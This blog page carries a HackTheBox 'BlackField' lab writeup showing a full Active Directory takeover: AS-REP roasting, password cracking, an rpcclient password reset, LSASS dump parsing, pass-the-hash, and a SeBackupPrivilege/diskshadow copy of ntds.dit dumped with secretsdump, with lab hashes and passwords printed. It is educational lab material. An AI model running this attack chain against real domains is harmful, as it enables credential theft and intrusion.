<!DOCTYPE html><html><head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes">
  
  
  <title>  Ikonw Blog </title>

 
  
    <link rel="icon" href="/images/avatar.jpg">
  


  
<link rel="stylesheet" href="/nayo.min.css">
 
<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Ikonw" type="application/atom+xml">
</head>  
  <body>   
    
      <header class="header-wrapper">
  <nav class="inner">
    <div class="title">
      <a href="/">
        <img class="logo" src="/images/logo.png">
      </a>
    </div>

    <ul class="menu">
      <li class="item">
        <a class="link" id="menu-home" href="/"> <!-- Home -->
          <i class="iconfont icon-home"></i>
        </a>
      </li>
      <li class="item">
        <a class="link" id="menu-archives" href="/archives"> <!-- Archives -->
          <i class="iconfont icon-archives"></i>
        </a>
      </li>
      <li class="item">
        <a class="link" id="menu-tags" href="/tags"> <!-- Tags -->
          <i class="iconfont icon-tags"></i>
        </a>
      </li>
      <li class="item">
        <a class="link" id="menu-about" href="/about"> <!-- About -->
          <i class="iconfont icon-about"></i>
        </a>
      </li>
      <li class="item">
        <a class="link" id="menu-search"> <!-- Search -->
          <i class="iconfont icon-search"></i>
        </a>
      </li>
    </ul>
  </nav>
</header>


<header class="mobile-header-wrapper">
  <i id="mobile-toggle" class="iconfont icon-menu mobile-toggle"></i>
</header>   

      <div class="container">       
          
          
            <div class="container-inner">  
          

          


<div class="index slideDownMin">
	

	<div class="profile">

		<img class="avatar" src="/images/avatar.jpg">

		<p class="author">Ikonw</p>

<div class="social">

<a class="iconfont icon-Github" target="_blank" href="https://github.com/Ik0nw" title="Github">
</a>

<a class="iconfont icon-Telegram" target="_blank" href="https://t.me/ikonwwww" title="Telegram">
</a>

</div>
	</div>


	

	
	
	

<article class="article">		
	   
	<div class="article-header">
	    
		<a class="title" href="/2020/06/10/HTB-BlackField/">HTB BlackField Writeup</a>  
	       
		 

		<div class="meta">
			<time>Jun 10, 2020</time>			
		</div>
	</div>


	

    
	<div class="typo article-excerpt">	
		 
			<p><img src="/images/HTB-Blackfield-Hard/image-20200907210058092.png" alt="image-20200907210058092"></p>
<h2 id="Author-Ikonw"><a href="#Author-Ikonw" class="headerlink" title="Author: Ikonw"></a>Author: Ikonw</h2><h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan:"></a>Nmap Scan:</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-07 20:09 +08</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.192</span><br><span class="line">Host is up (0.0074s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE    SERVICE       VERSION</span><br><span class="line">88/tcp   open     kerberos-sec  Microsoft Windows Kerberos (server time: 2020-09-07 19:09:38Z)</span><br><span class="line">135/tcp  open     msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  filtered netbios-ssn</span><br><span class="line">389/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open     microsoft-ds?</span><br><span class="line">593/tcp  open     ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">3268/tcp open     ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)</span><br><span class="line">5985/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 6h59m59s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2020-09-07T19:09:47</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 51.59 seconds</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>Launch smbmap login using anonymous account, found 2 files we can read</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[/opt/nmapAutomator]</span><br><span class="line">â””â”€<span class="comment"># smbmap -H 10.10.10.192 -u anonymous                                                                                   2 â¨¯</span></span><br><span class="line">[+] Guest session       IP: 10.10.10.192:445    Name: 10.10.10.192                                      </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Remote Admin</span><br><span class="line">        C$                                                      NO ACCESS       Default share</span><br><span class="line">        forensic                                                NO ACCESS       Forensic / Audit share.</span><br><span class="line">        IPC$                                                    READ ONLY       Remote IPC</span><br><span class="line">        NETLOGON                                                NO ACCESS       Logon server share </span><br><span class="line">        profiles$                                               READ ONLY</span><br><span class="line">        SYSVOL                                                  NO ACCESS       Logon server share </span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>



<p>Access to <strong>profiles$</strong></p>
<p>We found tons of user name, use along with awk command we collect the usernames</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">smbclient \\\\10.10.10.192\\profiles$ -c <span class="built_in">ls</span> | awk <span class="string">'{print $1}'</span> &gt; user.lst</span><br></pre></td></tr></tbody></table></figure>

<p>Launch the impacket tool <strong>GetNPUsers.py</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/hackthebox/Windows/blackfield]</span><br><span class="line">â””â”€<span class="comment"># python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py BLACKFIELD.local/ -no-pass -usersfile user.lst | grep -v "not found"</span></span><br><span class="line">Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[-] User audit2020 doesn<span class="string">'t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">$krb5asrep$23$support@BLACKFIELD.LOCAL:d3f58a3eb5d36dc74f2c4a4335a5ce3e$06ce4ccf78e620d6e2e9994bd546f519cabec98dd1879365456bcee2081d7f0579d8e6b20d7b0e5750c533de72b48404ad38bf2241acc01cdf9e1868717cb01142ab131ebda7de2a0916a141ba5b1fd1b8e0895833ea57ce4b01cd93900eba7c4bab1e1a8dfcdb471486fedc1f731b5e65f38219e37883274350288d916e18f43359a170dd9aa3ef22d53c399378ed3467467211d6be448ee73983abe6cf7998725bfa70b7de45969715c15417af5249ebe9dd16332222f17101bbb1bdbfc2d32ac2bc319302911973a88a2b67fd425092e0f31329d04fd9eca106a97f2265185f6ae6c8ca8e747272dcad410bfbedac0275ed12</span></span><br><span class="line"><span class="string">[-] User svc_backup doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] invalid principal syntax</span><br></pre></td></tr></tbody></table></figure>

<p>Save the hash and use john to crack it.</p>
<p>We got the creds <strong>support:#00^BlackKnight</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/hackthebox/Windows/blackfield]</span><br><span class="line">â””â”€<span class="comment"># john --wordlist=/usr/share/wordlists/rockyou.txt user_hash</span></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">'q'</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line"><span class="comment">#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)</span></span><br><span class="line">1g 0:00:00:16 DONE (2020-09-07 21:30) 0.06203g/s 889266p/s 889266c/s 889266C/s <span class="comment">#1ByNature..#*burberry#*1990</span></span><br><span class="line">Use the <span class="string">"--show"</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>Try login using winrm port, but it failed.</p>
<p>Letâ€™s go back to use new credentials to smb server</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/hackthebox/Windows/blackfield]</span><br><span class="line">â””â”€<span class="comment"># smbmap -H 10.10.10.192 -u support -p "#00^BlackKnight"                                                                2 â¨¯</span></span><br><span class="line">[+] IP: 10.10.10.192:445        Name: BLACKFIELD.<span class="built_in">local</span>                                  </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Remote Admin</span><br><span class="line">        C$                                                      NO ACCESS       Default share</span><br><span class="line">        forensic                                                NO ACCESS       Forensic / Audit share.</span><br><span class="line">        IPC$                                                    READ ONLY       Remote IPC</span><br><span class="line">        NETLOGON                                                READ ONLY       Logon server share </span><br><span class="line">        profiles$                                               READ ONLY</span><br><span class="line">        SYSVOL                                                  READ ONLY       Logon server share </span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>Found nothing interesting </p>
<p>use rpcclient connect to rpc</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">rpcclient -U blackfield.local\\support 10.10.10.192</span><br><span class="line">rpcclient $&gt; enumdomusers</span><br><span class="line">user:[Administrator] rid:[0x1f4]</span><br><span class="line">user:[Guest] rid:[0x1f5]</span><br><span class="line">user:[krbtgt] rid:[0x1f6]</span><br><span class="line">user:[audit2020] rid:[0x44f]</span><br><span class="line">user:[support] rid:[0x450]</span><br><span class="line">user:[BLACKFIELD764430] rid:[0x451]</span><br><span class="line">user:[BLACKFIELD538365] rid:[0x452]</span><br><span class="line">user:[BLACKFIELD189208] rid:[0x453]</span><br><span class="line">user:[BLACKFIELD404458] rid:[0x454]</span><br><span class="line">user:[BLACKFIELD706381] rid:[0x455]</span><br><span class="line">user:[BLACKFIELD937395] rid:[0x456]</span><br><span class="line">...........................</span><br></pre></td></tr></tbody></table></figure>

<p>We got tons of user again.</p>
<p>After research, nothing special. But came along with a article using rpc to reset domain user password</p>
<p><a target="_blank" rel="noopener" href="https://room362.com/post/2017/reset-ad-user-password-with-linux/">Reset AD User password with Linux</a></p>
<p>Make a change to user <strong>audit2020</strong> password to Ikonw123!</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">rpcclient $&gt; setuserinfo2</span><br><span class="line">Usage: setuserinfo2 username level password [password_expired]</span><br><span class="line">result was NT_STATUS_INVALID_PARAMETER</span><br><span class="line">rpcclient $&gt; setuserinfo2 audit2020 23 Ikonw123!</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>Sadly, we still not able login using winrm but we can access <strong>audit2020</strong>â€˜s smb share again.</p>
<p>yeah smb share againnnn.</p>
<p>This time round, forensic folder is available to us</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[/opt/nmapAutomator/10.10.10.192/nmap]</span><br><span class="line">â””â”€<span class="comment"># smbmap -H 10.10.10.192 -u audit2020 -p Ikonw123!</span></span><br><span class="line">[+] IP: 10.10.10.192:445        Name: BLACKFIELD.<span class="built_in">local</span>                                  </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Remote Admin</span><br><span class="line">        C$                                                      NO ACCESS       Default share</span><br><span class="line">        forensic                                                READ ONLY       Forensic / Audit share.</span><br><span class="line">        IPC$                                                    READ ONLY       Remote IPC</span><br><span class="line">        NETLOGON                                                READ ONLY       Logon server share </span><br><span class="line">        profiles$                                               READ ONLY</span><br><span class="line">        SYSVOL                                                  READ ONLY       Logon server share </span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight tap"><table><tbody><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[/opt/nmapAutomator/10.10.10.192/nmap]</span><br><span class="line">â””â”€<span class="comment"># smbclient \\\\10.10.10.192\\forensic -U audit2020                                      </span></span><br><span class="line">Enter WORKGROUP\audit2020's password: </span><br><span class="line">Try "help" to get a list of possible commands.</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D       <span class="number"> 0 </span> Sun Feb<span class="number"> 23 </span>21:03:16 2020</span><br><span class="line">  ..                                  D       <span class="number"> 0 </span> Sun Feb<span class="number"> 23 </span>21:03:16 2020</span><br><span class="line">  commands_output                     D       <span class="number"> 0 </span> Mon Feb<span class="number"> 24 </span>02:14:37 2020</span><br><span class="line">  memory_analysis                     D       <span class="number"> 0 </span> Fri May<span class="number"> 29 </span>04:28:33 2020</span><br><span class="line">  tools                               D       <span class="number"> 0 </span> Sun Feb<span class="number"> 23 </span>21:39:08 2020</span><br><span class="line"></span><br><span class="line">               <span class="number"> 7846143 </span>blocks of size 4096.<span class="number"> 3978511 </span>blocks available</span><br><span class="line">smb: \&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>Alright, it seems tons of files. Download the folder to local (If your internet connection is slow, you might also consider just mount the smb directory to local)</p>
<figure class="highlight apache"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">recurse</span> <span class="literal">ON</span></span><br><span class="line"><span class="attribute">prompt</span> <span class="literal">OFF</span></span><br><span class="line"><span class="attribute">mget</span> *</span><br></pre></td></tr></tbody></table></figure>



<blockquote>
<p>A DMP file is a file that contains data â€œdumpedâ€ from a programâ€™s memory space. It is often created when a program has an error or crashes and may also be saved by the program â€œSavedump.exeâ€ on the first reboot after a crash. DMP files are usually named â€œMemory.dmp.â€</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/skelsec/pypykatz">pypykatz</a> has the ability to parse the secrets hidden in the LSASS process, it is just something like mimikatzâ€™s <strong>sekurlsa::</strong></p>
<figure class="highlight nginx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">pypykatz</span> lsa minidump lsass.DMP</span><br></pre></td></tr></tbody></table></figure>

<p>and we actually got the password hash for user <strong>svc_backup</strong></p>
<figure class="highlight asciidoc"><table><tbody><tr><td class="code"><pre><span class="line"><span class="section">== MSV ==</span></span><br><span class="line"><span class="code">        Username: svc_backup</span></span><br><span class="line"><span class="code">        Domain: BLACKFIELD</span></span><br><span class="line"><span class="code">        LM: NA</span></span><br><span class="line"><span class="code">        NT: 9658d1d1dcd9250115e2205d9f48400d</span></span><br><span class="line"><span class="code">        SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>No need to bruteforce, we can directly pass the hash using evil-winrm</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">â”€â”€(rootğŸ’€kali)-[/opt/nmapAutomator/10.10.10.192/nmap/memory_analysis]</span><br><span class="line">â””â”€# evil-winrm.rb -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i 10.10.10.192   </span><br></pre></td></tr></tbody></table></figure>

<h2 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h2><p>After checking the userâ€™s privileges, found out that <strong>SeBackupPrivilege</strong> is enabled.</p>
<blockquote>
<p><strong>SeBackupPrivilege</strong><br>Description: This privilege causes the system to grant all read access control to any file, regardless of the <a target="_blank" rel="noopener" href="https://msdn.microsoft.com/library/windows/desktop/ms721532#-security-access-control-list-gly"><em>access control list</em></a> (ACL) specified for the file.</p>
</blockquote>
<p>Firstly, I tried the <strong>vssadmin</strong>, well I donâ€™t have the privilege</p>
<figure class="highlight subunit"><table><tbody><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users&gt; vssadmin create shadow /for=C:</span><br><span class="line">vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool</span><br><span class="line">(C) Copyright 2001<span class="string">-2013</span> Microsoft Corp.</span><br><span class="line"></span><br><span class="line"><span class="keyword">Error: </span>You don't have the correct permissions to run this command.  Please run this utility from a command</span><br><span class="line">window that has elevated administrator privileges.</span><br></pre></td></tr></tbody></table></figure>

<blockquote>
<p>Members of â€œBackup Operatorsâ€ can logon locally on a Domain Controller and backup the NTDS.DIT, for ex. with: â€œwbadmin.exeâ€ or â€œdiskshadow.exe</p>
</blockquote>
<p>As I read carefully, found out that diskshadow allow us to create a new shadow disk copy of the disk C and expose it as another driver</p>
<p>shadow_copy.txt</p>
<figure class="highlight gams"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> context <span class="comment">persistent nowriters</span></span><br><span class="line">add <span class="comment">volume c: alias ikonw</span></span><br><span class="line">create</span><br><span class="line">expose <span class="comment">%ikonw% z:</span></span><br></pre></td></tr></tbody></table></figure>

<p>However it has error </p>
<figure class="highlight pgsql"><table><tbody><tr><td class="code"><pre><span class="line">-&gt; <span class="keyword">set</span> context persistent nowriter  &lt;&lt;<span class="comment">--- shudnt it be nowriters?</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> CONTEXT { CLIENTACCESSIBLE | PERSISTENT [ NOWRITERS ] | <span class="keyword">VOLATILE</span> [ NOWRITERS ] }</span><br><span class="line"></span><br><span class="line">        CLIENTACCESSIBLE        Specify <span class="keyword">to</span> <span class="keyword">create</span> shadow copies usable <span class="keyword">by</span> client versions <span class="keyword">of</span> Windows.</span><br><span class="line">        PERSISTENT              Specify that shadow <span class="keyword">copy</span> <span class="keyword">is</span> persist across program <span class="keyword">exit</span>, <span class="keyword">reset</span> <span class="keyword">or</span> reboot.</span><br><span class="line">        PERSISTENT NOWRITERS    Specify that shadow <span class="keyword">copy</span> <span class="keyword">is</span> persistent <span class="keyword">and</span> <span class="keyword">all</span> writers are excluded.</span><br><span class="line">        <span class="keyword">VOLATILE</span>                Specify that shadow <span class="keyword">copy</span> will be deleted <span class="keyword">on</span> <span class="keyword">exit</span> <span class="keyword">or</span> <span class="keyword">reset</span>.</span><br><span class="line">        <span class="keyword">VOLATILE</span> NOWRITERS      Specify that shadow <span class="keyword">copy</span> <span class="keyword">is</span> <span class="keyword">volatile</span> <span class="keyword">and</span> <span class="keyword">all</span> writers are excluded.</span><br><span class="line"></span><br><span class="line">        Example: <span class="keyword">SET</span> CONTEXT CLIENTACCESSIBLE</span><br></pre></td></tr></tbody></table></figure>

<p>Add extra character behind</p>
<figure class="highlight gams"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> context <span class="comment">persistent nowriterss</span></span><br><span class="line">add <span class="comment">volume c: alias ikonww</span></span><br><span class="line">createe</span><br><span class="line">expose <span class="comment">%ikonw% z::</span></span><br></pre></td></tr></tbody></table></figure>

<p>However one more error!!</p>
<figure class="highlight livecodeserver"><table><tbody><tr><td class="code"><pre><span class="line">The .cab metadata <span class="built_in">file</span> cannot be stored <span class="keyword">in</span> <span class="keyword">the</span> current working <span class="built_in">directory</span>, because <span class="keyword">it</span> is <span class="built_in">read</span>-only.</span><br></pre></td></tr></tbody></table></figure>

<p>ermmm, maybe I am in the <strong>document directory</strong></p>
<p>create a temp folder at <strong>C:\temp</strong></p>
<p>Finally, we successfully create the shadow disk at Z: drive</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\temp&gt; diskshadow /s shadow_copy.txt</span><br><span class="line">Microsoft DiskShadow version 1.0</span><br><span class="line">Copyright (C) 2013 Microsoft Corporation</span><br><span class="line">On computer:  DC01,  9/8/2020 5:40:45 AM</span><br><span class="line"></span><br><span class="line">-&gt; <span class="built_in">set</span> context persistent nowriters</span><br><span class="line">-&gt; add volume c: <span class="built_in">alias</span> ikonw</span><br><span class="line">-&gt; create</span><br><span class="line">Alias ikonw <span class="keyword">for</span> shadow ID {f3ecf98c-d3cb-4ffe-8dc8-b613d3ab5922} <span class="built_in">set</span> as environment variable.</span><br><span class="line">Alias VSS_SHADOW_SET <span class="keyword">for</span> shadow <span class="built_in">set</span> ID {115480f7-6f83-46ee-8ea6-4fcf8bcb1d81} <span class="built_in">set</span> as environment variable.</span><br><span class="line"></span><br><span class="line">Querying all shadow copies with the shadow copy <span class="built_in">set</span> ID {115480f7-6f83-46ee-8ea6-4fcf8bcb1d81}</span><br><span class="line"></span><br><span class="line">        * Shadow copy ID = {f3ecf98c-d3cb-4ffe-8dc8-b613d3ab5922}               %ikonw%</span><br><span class="line">                - Shadow copy <span class="built_in">set</span>: {115480f7-6f83-46ee-8ea6-4fcf8bcb1d81}       %VSS_SHADOW_SET%</span><br><span class="line">                - Original count of shadow copies = 1</span><br><span class="line">                - Original volume name: \\?\Volume{351b4712-0000-0000-0000-602200000000}\ [C:\]</span><br><span class="line">                - Creation time: 9/8/2020 5:40:45 AM</span><br><span class="line">                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2</span><br><span class="line">                - Originating machine: DC01.BLACKFIELD.<span class="built_in">local</span></span><br><span class="line">                - Service machine: DC01.BLACKFIELD.<span class="built_in">local</span></span><br><span class="line">                - Not exposed</span><br><span class="line">                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}</span><br><span class="line">                - Attributes:  No_Auto_Release Persistent No_Writers Differential</span><br><span class="line"></span><br><span class="line">Number of shadow copies listed: 1</span><br><span class="line">-&gt; expose %ikonw% z:</span><br><span class="line">-&gt; %ikonw% = {f3ecf98c-d3cb-4ffe-8dc8-b613d3ab5922}</span><br><span class="line">The shadow copy was successfully exposed as z:\.</span><br><span class="line">-&gt;</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/HTB-Blackfield-Hard/image-20200908134638982.png" alt="image-20200908134638982"></p>
<p>The z: drive shadow folder permission also inherited from the C:, we dont have the permission to download the files.</p>
<p>After looking at the <a target="_blank" rel="noopener" href="https://github.com/giuliano108/SeBackupPrivilege">github page</a></p>
<blockquote>
<ul>
<li>If you want to read/copy data out of a â€œnormally forbiddenâ€ folder, you have to act as a backup software. The shell <code>copy</code> command wonâ€™t work; youâ€™ll need to open the source file manually using <code>CreateFile</code> making sure to specify the <code>FILE_FLAG_BACKUP_SEMANTICS</code> flag.</li>
</ul>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll">SeBackupPrivilegeCmdLets.dll</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll">SeBackupPrivilegeUtils.dll</a></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">Evil-WinRM* PS C:\temp&gt; Import-Module .\SeBackupPrivilegeUtils.dll</span><br><span class="line">*Evil-WinRM* PS C:\temp&gt; Import-Module .\SeBackupPrivilegeCmdLets.dll</span><br><span class="line">*Evil-WinRM* PS C:\temp&gt; <span class="built_in">cd</span> z:\windows\ntds</span><br><span class="line">*Evil-WinRM* PS z:\windows\ntds&gt; Copy-FileSeBackupPrivilege ntds.dit c:\temp\ntds.dit</span><br><span class="line">*Evil-WinRM* PS z:\windows\ntds&gt; <span class="built_in">cd</span> c:\temp</span><br><span class="line">*Evil-WinRM* PS C:\temp&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\temp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-a----         9/8/2020   5:40 AM            617 2020-09-08_5-40-45_DC01.cab</span><br><span class="line">-a----         9/8/2020   5:52 AM       18874368 ntds.dit</span><br><span class="line">-a----         9/8/2020   5:50 AM          12288 SeBackupPrivilegeCmdLets.dll</span><br><span class="line">-a----         9/8/2020   5:51 AM          16384 SeBackupPrivilegeUtils.dll</span><br><span class="line">-a----         9/8/2020   5:40 AM             88 shadow_copy.txt</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>and we got the ntds.dit files. download to kali</p>
<p>and use <strong>secretsdump</strong> ,I just realize still need a extra system hive file.</p>
<figure class="highlight nsis"><table><tbody><tr><td class="code"><pre><span class="line">reg save <span class="params">HKLM</span>\<span class="params">SYSTEM</span> c:\temp\<span class="params">system</span>.hive</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/hackthebox/Windows/blackfield]</span><br><span class="line">â””â”€<span class="comment"># python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ntds.dit -system system.hive -hashes lmhash:nthash LOCAL -outputfile hash | more</span></span><br><span class="line">Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation</span><br><span class="line">[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Searching <span class="keyword">for</span> pekList, be patient</span><br><span class="line">[*] PEK <span class="comment"># 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c</span></span><br><span class="line">[*] Reading and decrypting hashes from ntds.dit </span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DC01$:1000:aad3b435b51404eeaad3b435b51404ee:65557f7ad03ac340a7eb12b9462f80d6:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::</span><br><span class="line">audit2020:1103:aad3b435b51404eeaad3b435b51404ee:c95ac94a048e7c29ac4b4320d7c9d3b5:::</span><br><span class="line">support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::</span><br></pre></td></tr></tbody></table></figure>

<p>and we got the administrator hash, use evil-winrm to login and we got root!</p>
<br>
<br>
<br>


<p><img src="/images/root.gif" alt="root"></p>

		  	  
	</div>



	<div class="article-categories">
	 
      <i class="iconfont icon-category" style="margin-right:4px"></i>
	  	            
				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
		
      
	</div>
	

	<div class="article-tags">
		
			<i class="iconfont icon-tags" style="margin-right:4px"></i>
			            
				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
			            
				<a class="link" href="/tags/hard/">hard</a>           
			
		
	</div>

	<div class="article-bottom">
		<a class="readmore" href="/2020/06/10/HTB-BlackField/">Continue</a> 	
	</div>	
    
</article>

	
	
	
	

<article class="article">		
	   
	<div class="article-header">
	    
		<a class="title" href="/2020/05/12/HTB-cache/">HTB Cache Writeup</a>  
	       
		 

		<div class="meta">
			<time>May 12, 2020</time>			
		</div>
	</div>


	

    
	<div class="typo article-excerpt">	
		
			<p>Cache writeup available</p>
		  	  
	</div>



	<div class="article-categories">
	 
      <i class="iconfont icon-category" style="margin-right:4px"></i>
	  	            
				<a class="link" href="/categories/HackTheBox-Medium/">HackTheBox-Medium</a>           
		
      
	</div>
	

	<div class="article-tags">
		
			<i class="iconfont icon-tags" style="margin-right:4px"></i>
			            
				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
			
		
	</div>

	<div class="article-bottom">
		<a class="readmore" href="/2020/05/12/HTB-cache/">Continue</a> 	
	</div>	
    
</article>

	
	
	
	

<article class="article">		
	   
	<div class="article-header">
	    
		<a class="title" href="/2020/02/10/HTB-Active/">HTB Active Writeup</a>  
	       
		 

		<div class="meta">
			<time>Feb 10, 2020</time>			
		</div>
	</div>


	

    
	<div class="typo article-excerpt">	
		 
			<p>æ”»å‡»æœºï¼šå®˜æ–¹Kali linux 2019 64ä½<br>ä½œè€…ï¼š<strong>Ikonw</strong></p>
<h1 id="é¶æœºä»‹ç»"><a href="#é¶æœºä»‹ç»" class="headerlink" title="é¶æœºä»‹ç»"></a>é¶æœºä»‹ç»</h1><p><img src="/images/placeholder.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-src="/images/old-machine-images/20200210210254278.png" class="lazyload"></p>
<h1 id="ä¸€ï¼Œç«¯å£æ‰«æ"><a href="#ä¸€ï¼Œç«¯å£æ‰«æ" class="headerlink" title="ä¸€ï¼Œç«¯å£æ‰«æ"></a>ä¸€ï¼Œç«¯å£æ‰«æ</h1><p>è¿™è¾¹æˆ‘ç”¨çš„æ˜¯æˆ‘åœ¨OSCPæ—¶å€™ç”¨çš„ä¸€ä¸ªè„šæœ¬å·¥å…·ï¼ˆæ‡’æƒ°ï¼‰</p>
<p><a target="_blank" rel="noopener" href="https://github.com/21y4d/nmapAutomator">nmapAutomator</a><br><img src="/images/placeholder.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-src="/images/old-machine-images/202002102107263.png" class="lazyload"></p>
